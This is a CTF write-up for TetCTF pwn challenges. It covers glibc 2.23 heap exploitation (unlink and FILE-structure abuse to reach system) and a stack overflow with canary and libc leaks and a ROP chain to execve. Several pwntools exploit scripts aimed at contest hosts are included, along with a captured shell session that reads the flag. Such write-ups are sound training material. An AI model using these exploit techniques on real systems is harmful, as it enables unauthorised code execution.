---
title: "TetCTF"
date: 2019-01-01T13:34:45+07:00
draft: true
---

# Pwn

## Baby Sandbox


## Babyheap

- This is a typical heap challenge interface with a jump table:
    - alloc
    - edit
    - delete
    - show
- Alloc:
    - Doesn't prompt for a size.
    - Also doesn't have canary (strange...)
    - Alloc fixed size of 0x98 and store in a global array, max 6 chunks
- Edit:
- Delete:
    - Free then set 0 at the global array
- Show:
    - Magic: %ld
    - Content: %s
- The size of the allocated memory is exactly the sum of the member sizes. When using scanf, the last newline byte will be replaced with a null byte, results in 1-byte overflow into the next chunk's size.

- This is glibc 2.23 so we can use the main_arena leak:
    - Allocate 2 chunks.
    - Free the first chunk then allocate again.
    - Show the first chunk and the address of `main_arena` will be shown.

- The first idea I've got about the one-byte overflow is to first allocate some chunks of the same size, and then free 2 in the between, then modify the marginal chunks to overwrite the header of the freed chunks so when we allocate again, `malloc` will return a different pointer than we usually expect.
- Something can probably be done based on the "shrinking free chunks" attack. But since the malloc size is fixed here, to get larger freed chunks, we can allocate and free 2 consecutive chunks so they coalesce.
- To bypass the `p->next->prevsize == p->size` check, we need to add fake `prevsize` to the chunk in between before freeing it.
- Real size is 0xa0
- Heap can be leaked by allocating at least 3 chunks and free 2 non-consecutives so the fd and bk in each are populated. Then allocate the chunk again and dump it.

- Need to allocate 5 chunks so when freeing 3, top chunk is not coalesced
- Need to fix fd and bk of chunk 1 to manipulate the unlink
- whatever in the fd and bk will be put onto the unsorted bin after the unlink. Then the thing in it will be returned in the next malloc
    fd + 8 * 4 == fd -> bk == P
    bk + 8 * 3 == bk -> fd == P
    fd -> bk = bk
    bk -> fd = fd
- Layout:
    ```python
    0x000:  Chunk 0
    0x0a0:  Chunk 1
    0x140:  Chunk 2
    0x1e0:  Chunk 3
    0x280:  Chunk 4
    0x320:  Chunk 5
    Need 0x1a0 to be 0x100 to be persistent with Chunk 1's size
    malloc_hook malloc_hook + 8
    main_arena  main_arena + 8
    ```

- I've just figured out that we can corrupt the prev_size of the next chunk as well, in addition to the first byte of the size to be 0.
    - Shrink size of the free chunk or current chunk.
- Oh man I've just figured out, too, that it's not an off-by-one but off by many wtf.

- Okay here's a new approach
    - alloc 0 1 2
    - make fake chunk inside 1 ==> 0 | 1 corrupted | fake chunk(s)
    - corrupt size of 1 using 0
    - free 1
    - Corrupt size to make 1 a fast chunk?? Then make more fast chunks to turn this into a fastbin attack?

- So the idea is to eventually make a chunk of 2 different size appear in the unsorted bin so when 1 get allocated, the other still in the free list and we can manipulate it to create a fake chunk inside and then get it to return a desired pointer.

- SO here's another approach
    - Allocate all chunks. The target is to corrupt the prev_size of chunk 4 to `0x200` so when we free it, we have to to unlink a fake chunk at `0x320 - 0x200 = 0x120`
    - Fake chunk will be created inside chunk 1
    - Shrink a chunk and do the thing and free it so it unlink with the fake chunk

- Can't overwrite the prev_size if the prev chunk is freed :(
- Wait. If I can overlap with the top chunk so I can control 2 chunk while it's both free and allocated :o
- SO new plan
    - Get the overlap at chunk 1
    - When allocate again chunk 2 is the same as chunk 1
    - Allocate 3 and 4 then do the trick above. Free 2 so the prev_in_use bit is unset be we can still overwrite the prev_size. This will allow 3 to unlink a fake chunk when we free it.
- Surprisingly freeing the overlap chunk put it in unsorted bin and we can control the bins while it's on the free list. Here we go
- Now I can write a pointer to the heap (actually it's address of main_arena) to what seems like an arbitrary location
- Alright so eventually I've found out that it's a FILE structure exploit where I can overwrite `_IO_list_all` with the address of an unsorted bin. We can get the shell by triggering an error and all the file pointers will be closed. Basically we'll overwrite the address of `_IO_OVERFLOW` in the FILE vtable with `system`. In addition, we need to forge a FILE structure to satisfy some condition so the overwritten `_IO_OVERFLOW` function is called. The FILE structure will be at the smallbin of size 0x60 (smallbin[4])
- Need vtable address at 0x218
- Actually what we did is pointing `_IO_list_all` to a fake filestream and a fake vtable and in that vtable the entry of `_IO_OVERFLOW` is `system` as we set it up.

```python
from __future__ import print_function
from pwn import *
import os

GDBSCRIPT = """
"""
HOST = '18.136.126.78'
PORT = 1336
BIN = './pwn03'
LIBC = './libc-2.23.so'


ALLOC = '1'
EDIT = '2'
REMOVE = '3'
SHOW = '4'
EXIT = '5'
PROMPT = 'YOUR CHOICE : '

libc = ELF(LIBC)

addrs = {
    'mainarena': 0x3c4b78,
    'mallochook': libc.symbols['__malloc_hook'],
    'stdin': 0x3c48e0,
    'iolistall': 0x3c5520,
    'system': libc.symbols['system']
}


if os.environ.has_key('remote'):
    r = remote(HOST, PORT)
else:
    e = ELF(BIN)
    r = process(e.path)#, env={'LD_PRELOAD': LIBC})

if os.environ.has_key('debug'):
    gdb.attach(r, gdbscript=GDBSCRIPT)

def optalloc():
    r.recvuntil(PROMPT)
    r.sendline(ALLOC)
    if 'FULL' in r.recvline():
        print('ALLOC FAILED')


def optedit(idx, magic, content, l=True):
    r.recvuntil(PROMPT)
    r.sendline(EDIT)
    r.recvuntil('Index : ')
    r.sendline(str(idx))
    r.recvuntil('Magic : ')
    r.sendline(str(magic))
    r.recvuntil('Content : ')
    if l:
        r.sendline(content)
    else:
        r.send(content)

def optremove(idx):
    r.recvuntil(PROMPT)
    r.sendline(REMOVE)
    r.recvuntil('Index : ')
    r.sendline(str(idx))

def optshow(idx):
    r.recvuntil(PROMPT)
    r.sendline(SHOW)    
    r.recvuntil('Index : ')
    r.sendline(str(idx))
    data = r.recvuntil('\nMENU').split('\n')[:2]
    magic = int(data[0].split('Magic : ')[1])
    content = data[1].split('Content : ')[1].ljust(8, '\x00')
    content = u64(content)
    return (magic, content)

def optexit():
    r.recvuntil(PROMPT)
    r.sendline(EXIT)

def leak():
    optalloc()  # 0
    optalloc()  # 1
    optalloc()  # 2
    optalloc()  # 3
    optremove(0) # -0
    optremove(2) # -2
    optalloc()  # 0
    leakptrs = optshow(0)
    libcbase = leakptrs[0] - addrs['mainarena']
    heapbase = leakptrs[1] - 0x140
    return (libcbase, heapbase)    

def heapexp():
    global libcbase
    global heapbase
    
    addrs['system'] += libcbase
    payload = p64(0) * 4
    payload += p64(heapbase + 0x220 - 0x18)
    payload += p64(addrs['system'])
    optedit(3, 0x0, payload)
    
    optalloc()  # 2
    # By pass prev_size vs size when dealing with chunk 1 later
    # If it's freed, it'll be checked
    payload = 'A' * (0x1a0 - 0x158)
    payload += p64(0x100)
    optedit(2, 0x13371, payload)

    # Consolidate 1 and 2 to get size 0x140    
    optremove(1)
    optremove(2)

    # Overwrite first time
    chunk1 = heapbase + 0xa0
    payload = p64(chunk1)
    payload = payload.ljust(144, 'B')
    optedit(0, chunk1, payload)

    # Populate chunk 1 with the correct fd and bk
    payload = p64(heapbase)
    optalloc()  # 1
    optedit(1, heapbase, payload)

    # Free 3 so it consolidate with top chunk and chunk 1
    # because of the incorrect size. After this, chunk 1
    # will overlap with top chunk. Another alloc will make
    # chunk 2 the same as chunk 1
    optremove(3)
    optalloc()  # 2
    
    # Do the trick
    optalloc()  # 3

#    optalloc()  # 4
    # Set prev_in_use of chunk 3 to 0
    # This also put chunk 1/2 to unsorted bin
    optremove(2)
    
    # Modify prev_size of chunk 3
#    payload = '1' * 8
#    payload += 'D' * (144 - 8 * 2)
#    payload += '\x00\x01'
    addrs['iolistall'] += libcbase
    print('iolistall @ {:#x}'.format(addrs['iolistall']))
    payload = p64(addrs['iolistall'] - 0x10)
    payload += 'A' * 8
    optedit(1, 0x13373, payload)   
 
    # Alloc so _IO_list_all is overwritten to main_arena
    optalloc()  # 2
    
    # Now we need to fake a FILE at chunk 3 (0x140)
    # Edit chunk 1/2 to write /bin/sh to the beginning of chunk 3
    payload = 'F' * (144 - 8)
    payload += '/bin/sh'
    optedit(2, 0x1336, payload)

    # Craft filestream
    # Magic: _IO_read_end
    # _IO_read_base
    fs = p64(addrs['iolistall'] - 0x10)
#    fs = p64(0xdeadbeef)
    fs += p64(0) + p64(1) # _IO_write_base < _IO_write_ptr
    fs = fs.ljust(143, '\x00')
    optedit(3, 0x0, fs)
    r.interactive() 

def main():
    raw_input('pwn?')
    global libcbase
    global heapbase
    libcbase, heapbase = leak()
    print("libc @ {:#x}".format(libcbase))
    print("heap @ {:#x}".format(heapbase))
    heapexp()
    r.close()

if __name__ == '__main__':
    main()
```

```python
from __future__ import print_function
from pwn import *
import os

GDBSCRIPT = """
"""
HOST = '18.136.126.78'
PORT = 1336
BIN = './pwn03'
LIBC = './libc-2.23.so'


ALLOC = '1'
EDIT = '2'
REMOVE = '3'
SHOW = '4'
EXIT = '5'
PROMPT = 'YOUR CHOICE : '

libc = ELF(LIBC)

addrs = {
    'mainarena': 0x3c4b78,
    'mallochook': libc.symbols['__malloc_hook']
}


if os.environ.has_key('remote'):
    r = remote(HOST, PORT)
else:
    e = ELF(BIN)
    r = process(e.path)#, env={'LD_PRELOAD': LIBC})

if os.environ.has_key('debug'):
    gdb.attach(r, gdbscript=GDBSCRIPT)

def optalloc():
    r.recvuntil(PROMPT)
    r.sendline(ALLOC)
    if 'FULL' in r.recvline():
        print('ALLOC FAILED')


def optedit(idx, magic, content, l=True):
    r.recvuntil(PROMPT)
    r.sendline(EDIT)
    r.recvuntil('Index : ')
    r.sendline(str(idx))
    r.recvuntil('Magic : ')
    r.sendline(str(magic))
    r.recvuntil('Content : ')
    if l:
        r.sendline(content)
    else:
        r.send(content)

def optremove(idx):
    r.recvuntil(PROMPT)
    r.sendline(REMOVE)
    r.recvuntil('Index : ')
    r.sendline(str(idx))

def optshow(idx):
    r.recvuntil(PROMPT)
    r.sendline(SHOW)    
    r.recvuntil('Index : ')
    r.sendline(str(idx))
    data = r.recvuntil('\nMENU').split('\n')[:2]
    magic = int(data[0].split('Magic : ')[1])
    content = data[1].split('Content : ')[1].ljust(8, '\x00')
    content = u64(content)
    return (magic, content)

def optexit():
    r.recvuntil(PROMPT)
    r.sendline(EXIT)

def leak():
    optalloc()  # 0
    optalloc()  # 1
    optalloc()  # 2
    optalloc()  # 3
    optremove(0) # -0
    optremove(2) # -2
    optalloc()  # 0
    leakptrs = optshow(0)
    libcbase = leakptrs[0] - addrs['mainarena']
    heapbase = leakptrs[1] - 0x140
    return (libcbase, heapbase)    

def heapexp():
    global libcbase
    global heapbase
   
    optalloc()  # 2
    
    # By pass prev_size vs size when dealing with chunk 1 later
    # If it's freed, it'll be checked
    payload = 'A' * (0x1a0 - 0x158)
    payload += p64(0x100)
    optedit(2, 0x13371, payload)

    # Consolidate 1 and 2 to get size 0x140    
    optremove(1)
    optremove(2)

    # Overwrite first time
    chunk1 = heapbase + 0xa0
    payload = p64(chunk1)
    payload = payload.ljust(144, 'B')
    optedit(0, chunk1, payload)

    # Populate chunk 1 with the correct fd and bk
    payload = p64(heapbase)
    optalloc()  # 1
    optedit(1, heapbase, payload)

    # Free 3 so it consolidate with top chunk and chunk 1
    # because of the incorrect size. After this, chunk 1
    # will overlap with top chunk. Another alloc will make
    # chunk 2 the same as chunk 1
    optremove(3)
    optalloc()  # 2
    
    # Do the trick
    optalloc()  # 3
    optalloc()  # 4

    # Set prev_in_use of chunk 3 to 0
    # This also put chunk 1/2 to unsorted bin
    optremove(2)
    
    # Modify prev_size of chunk 3
#    payload = '1' * 8
#    payload += 'D' * (144 - 8 * 2)
#    payload += '\x00\x01'
    payload = p64(heapbase + 0xa0)
    optedit(1, 0x13373, payload)   
 
    # Make fake chunk at 0x040
#    payload = 'C' * (8 * 6)
#    payload += p64(0x100) # 0x048
#    payload += p64(heapbase + 0x60) * 2
#    payload += 'C' * (8 * 2)
#    payload += p64(heapbase + 0x40) * 2
#    optedit(0, 0x13372, payload)

    # At this point, chunk 1/2 is the head of unsorted bin.
    # We can control pointers here
    r.interactive() 

def main():
    raw_input('pwn?')
    global libcbase
    global heapbase
    libcbase, heapbase = leak()
    print("libc @ {:#x}".format(libcbase))
    print("heap @ {:#x}".format(heapbase))
    heapexp()
    r.close()

if __name__ == '__main__':
    main()
```

```python
# 0x555555757010
# 0x5555557570b0
# 0x555555757150
# 0x5555557571f0
# 0x555555757290

from __future__ import print_function
from pwn import *
import os

GDBSCRIPT = """
"""
HOST = '18.136.126.78'
PORT = 1336
BIN = './pwn03'
LIBC = './libc-2.23.so'


ALLOC = '1'
EDIT = '2'
REMOVE = '3'
SHOW = '4'
EXIT = '5'
PROMPT = 'YOUR CHOICE : '

libc = ELF(LIBC)

addrs = {
    'mainarena': 0x3c4b78 
}


if os.environ.has_key('remote'):
    r = remote(HOST, PORT)
else:
    e = ELF(BIN)
    r = process(e.path, env={'LD_PRELOAD': LIBC})

if os.environ.has_key('debug'):
    gdb.attach(r, gdbscript=GDBSCRIPT)

def optalloc():
    r.recvuntil(PROMPT)
    r.sendline(ALLOC)
    if 'FULL' in r.recvline():
        print('ALLOC FAILED')


def optedit(idx, magic, content, l=True):
    r.recvuntil(PROMPT)
    r.sendline(EDIT)
    r.recvuntil('Index : ')
    r.sendline(str(idx))
    r.recvuntil('Magic : ')
    r.sendline(str(magic))
    r.recvuntil('Content : ')
    if l:
        r.sendline(content)
    else:
        r.send(content)

def optremove(idx):
    r.recvuntil(PROMPT)
    r.sendline(REMOVE)
    r.recvuntil('Index : ')
    r.sendline(str(idx))

def optshow(idx):
    r.recvuntil(PROMPT)
    r.sendline(SHOW)    
    r.recvuntil('Index : ')
    r.sendline(str(idx))
    data = r.recvuntil('\nMENU').split('\n')[:2]
    magic = int(data[0].split('Magic : ')[1])
    content = data[1].split('Content : ')[1].ljust(8, '\x00')
    content = u64(content)
    return (magic, content)

def optexit():
    r.recvuntil(PROMPT)
    r.sendline(EXIT)

def leak():
    optalloc()  # 0
    optalloc()  # 1
    optalloc()  # 2
    optalloc()  # 3
    optremove(0)
    optremove(2)
    optalloc()  # 0
    leakptrs = optshow(0)
    libcbase = leakptrs[0] - addrs['mainarena']
    heapbase = leakptrs[1] - 0x140
    return (libcbase, heapbase)    

def heapexp():
    optalloc()  # 2
    
    payload = 'A' * (0xa0 - 0x58) + 'B\x01'
    optedit(2, 0x13371337, payload)
    payload = 'A' * (0xa0 - 0x58)
    optedit(2, 0x13371337, payload)
    optremove(1)    
    optremove(2)
    
    payload = 'A' * 144
    optedit(0, 0x13371337, payload)
    
    r.interactive()    

def main():
    raw_input('pwn?')
    libcbase, heapbase = leak()
    print("libc @ {:#x}".format(libcbase))
    print("heap @ {:#x}".format(heapbase))
    heapexp()
    r.close()

if __name__ == '__main__':
    main()
```

## Babyfirst

- The binary has all protections on.
- The binary implements its own read function.
- The binary reads a password of length 0x20 from /dev/urandom
- Login function:
    - If the username starts with `admin` then prompt for a password.
    - Otherwise save the username to the buffer and count that as a logged in user.
- Leak password:
    - Input an accepted username of length 0x20 so it reaches the password buffer. The username must not starts with `admin` so it can be saved to the buffer without a password.
    - Choose to play so the username with the password is printed out.
- Play function:
    - It reads input of length 128 maximum and output it. This is stack overflow so we can leak the canary, binary base and libc base all in here.
    - After that, this can be a normal BoF challenge.
    
```
Before:
0x0d60806019c93615	0xef683548a35d647c
0x44346fe9e7682bf5	0x899ccab9462b6744

After:
0x0d60806019c93615	0xef683548a35d647c
0x44346fe9e7682bf5	0x899ccab9462b6744

```

`exploit.py`:

```python
from __future__ import print_function
from pwn import *
import os

GDBSCRIPT = """
"""
HOST = 'babyfirst.chung96vn.cf'
PORT = 31337
BIN = './babyfirst'
LIBC = './libc-2.27.so'

PROMPT = 'Your choice: '
LOGIN = '1'
PLAY = '2'
EXIT = '3'

bin_offset = 0xfc0
libc_offset = 0x21b97
libc = ELF(LIBC)

addrs = {
    'system': libc.symbols['system'],
    'binsh': libc.search('/bin/sh').next(),
    'poprdi': 0x000000000002155f,
    'poprax': 0x00000000000439c8,
    'poprsi': 0x0000000000023e6a,
    'poprdx': 0x0000000000001b96,
    'syscall': 0x00000000000d2975
}

if os.environ.has_key('remote'):
    r = remote(HOST, PORT)
else:
    e = ELF(BIN)
    r = process(e.path, env={'LD_PRELOAD': LIBC})

if os.environ.has_key('debug'):
    gdb.attach(r, gdbscript=GDBSCRIPT)

def login(username, password=None):
    r.recvuntil(PROMPT)
    r.sendline(LOGIN)
    r.recvuntil('User Name: ')
    r.sendline(username)
    if password != None:
        r.recvuntil('Password: ')
        r.sendline(password)

def play(play=None, payload=None):
    r.recvuntil(PROMPT)
    r.sendline(PLAY)
    if play == None:
        return r.recvuntil('Test Version only support for admin~')
    r.recvuntil('Content: ')
 
    # Leak stack
    payload = 'A' * (8 * 4)
    r.send(payload)
    stack = r.recvuntil('\n').split(payload)[1]
    if len(stack) < 6:
        print("LEAK STACK FAILED")
        exit(1)
    stack = stack[:6].ljust(8, '\x00')
    stack = u64(stack) - 0x140
    print("STACK = {}".format(hex(stack)))

    # Leaking canary
    payload = 'A' * (8 * 5 + 1)
    r.send(payload)
    canary = r.recvuntil('\n').split(payload)[1]
    if len(canary) < 7:
        print("LEAK CANARY FAILED")
        exit(1)
    canary = canary[:7].rjust(8, '\x00')
    canary = u64(canary)
    print("CANARY = {}".format(hex(canary)))

    # Leaking binary
    payload = 'A' * (8 * 12)
    r.send(payload)
    binleak = r.recvuntil('\n').split(payload)[1]
    if len(binleak) < 6:
        print("LEAK BINARY FAILED")
        exit(1)
    binleak = binleak[:6].ljust(8, '\x00')
    binleak = u64(binleak)
    print("BINLEAK = {}".format(hex(binleak)))

    binbase = binleak - bin_offset
    print("BIN BAsE = {}".format(hex(binbase)))

    # Leaking libc
    payload = 'A' * (8 * 13)
    r.send(payload)
    libcleak = r.recvuntil('\n').split(payload)[1]
    if len(libcleak) < 6:
        print("LEAK LIBC FAILED")
        exit(1)
    libcleak = u64(libcleak[:6].ljust(8, '\x00'))
    print("LIBCLEAK = {}".format(hex(libcleak)))

    libcbase = libcleak - libc_offset
    print("LIBC BASE = {}".format(hex(libcbase)))
    
    for k in addrs.keys():
        addrs[k] += libcbase

    payload = 'A' * (8 * 2)
    payload += p64(addrs['binsh'])
    payload += '\x00' * (8 * 2)
    payload += p64(canary)
    payload += 'B' * 8
    payload += p64(addrs['poprdi'])
    payload += p64(addrs['binsh'])
    payload += p64(addrs['poprsi'])
    payload += p64(stack + 0x10)
    payload += p64(addrs['poprdx'])
    payload += p64(0x0)
    payload += p64(addrs['poprax'])
    payload += p64(59)
    payload += p64(addrs['syscall'])
    assert len(payload) <= 128
    r.send(payload)
    
    print(repr(r.recvuntil('\n')))
    print("END==")
    r.sendline('END')
    print(r.recvuntil('\n'))
    r.interactive()

def exit():
    r.recvuntil(PROMPT)
    r.sendline(EXIT)

def leakpass():
    login('A' * 32)
    leak = play()
    leak = leak.split('A' * 32)[1].split('\nTest Version only support for admin~')[0]
    if len(leak) < 0x10:
        print("LEAK PASSWORD FAILED")
        return None
    leak = leak[:0x10]
    return leak

def main():
    raw_input("pwn?")
    password = leakpass()
    print("PASSWORD: {}".format(password.encode('hex')))
    login("admin", password)
    play(play=True)
    r.close()

if __name__ == '__main__':
    main()
```

```bash
➜  babyfirst remote=1 python exploit.py
[*] '/home/me/Desktop/tetctf/babyfirst/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to babyfirst.chung96vn.cf on port 31337: Done
pwn?
PASSWORD: ead76d78b8c95156fc838dd20e633463
STACK = 0x7ffdf4dbd4a0
CANARY = 0x2963933cecc44c00
BINLEAK = 0x55b917de2fc0
BIN BAsE = 0x55b917de2000
LIBCLEAK = 0x7fe18044cb97
LIBC BASE = 0x7fe18042b000
'AAAAAAAAAAAAAAAA\x9a\xee]\x80\xe1\x7f\n'
END==
END

[*] Switching to interactive mode
Every things is OK~~
$ ls
bin
boot
dev
etc
home
init.sh
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ ls -la
total 80
drwxr-xr-x   1 root root 4096 Dec 29 02:15 .
drwxr-xr-x   1 root root 4096 Dec 29 02:15 ..
-rwxr-xr-x   1 root root    0 Dec 29 02:15 .dockerenv
drwxr-xr-x   2 root root 4096 Nov 12 20:56 bin
drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
drwxr-xr-x   5 root root  340 Dec 29 02:15 dev
drwxr-xr-x   1 root root 4096 Dec 29 02:15 etc
drwxr-xr-x   1 root root 4096 Dec 29 02:15 home
-rwxr-xr-x   1 root root   54 Dec 29 02:12 init.sh
drwxr-xr-x   1 root root 4096 Nov 12 20:54 lib
drwxr-xr-x   2 root root 4096 Nov 12 20:55 lib64
drwxr-xr-x   2 root root 4096 Nov 12 20:54 media
drwxr-xr-x   2 root root 4096 Nov 12 20:54 mnt
drwxr-xr-x   2 root root 4096 Nov 12 20:54 opt
dr-xr-xr-x 120 root root    0 Dec 29 02:15 proc
drwx------   1 root root 4096 Dec 31 17:27 root
drwxrwxr--   1 root root 4096 Dec 29 02:15 run
drwxr-xr-x   1 root root 4096 Nov 19 21:20 sbin
drwxr-xr-x   2 root root 4096 Nov 12 20:54 srv
dr-xr-xr-x  13 root root    0 Dec 31 18:54 sys
drwx-wx-wt   1 root root 4096 Dec 25 09:48 tmp
drwxr-xr-x   1 root root 4096 Nov 12 20:54 usr
drwxr-xr-x   1 root root 4096 Nov 12 20:56 var
$ cd /home
$ ls
babyfirst
$ cd babyfirst
$ ls
babyfirst
flag
run.sh
$ ls -la
total 52
drwxr-x--- 1 root babyfirst  4096 Dec 31 17:37 .
drwxr-xr-x 1 root root       4096 Dec 29 02:15 ..
-rwxr-x--- 1 root babyfirst   220 Apr  4  2018 .bash_logout
-rwxr-x--- 1 root babyfirst  3771 Apr  4  2018 .bashrc
-rwxr-x--- 1 root babyfirst   807 Apr  4  2018 .profile
-rwxr-x--- 1 root babyfirst 13448 Dec 31 17:36 babyfirst
-r--r----- 1 root babyfirst    25 Dec 29 02:21 flag
-rwxr-x--- 1 root babyfirst    67 Dec 29 02:15 run.sh
$ cat flag
TetCTF{Y0U_4r3_N0T_Baby}
$ cat run.sh
#!/bin/sh
#

exec 2>/dev/null
timeout 60 /home/babyfirst/babyfirst
[*] Got EOF while reading in interactive
$ 
```

- Initially I made a call to `system("/bin/sh")` but it didn't work. My guest was that this new glibc 2.27 does some additional checks so the function can't be called directly like that. That's why I ended up doing a `sys_execve` instead.